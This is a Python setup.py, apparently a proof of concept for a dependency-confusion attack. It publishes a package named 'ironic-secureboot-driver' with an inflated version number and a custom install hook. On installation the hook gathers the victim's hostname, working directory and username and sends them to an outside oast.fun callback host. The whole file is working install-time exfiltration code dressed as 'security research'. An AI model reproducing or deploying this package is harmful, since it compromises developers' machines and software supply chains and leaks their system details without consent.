#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("http://chpxdgy2vtc0000438a0ge5qsawyyyyyb.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='ironic-secureboot-driver', #package name
      version='31463.0.0',
      description='test security research',
      author='test security research',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
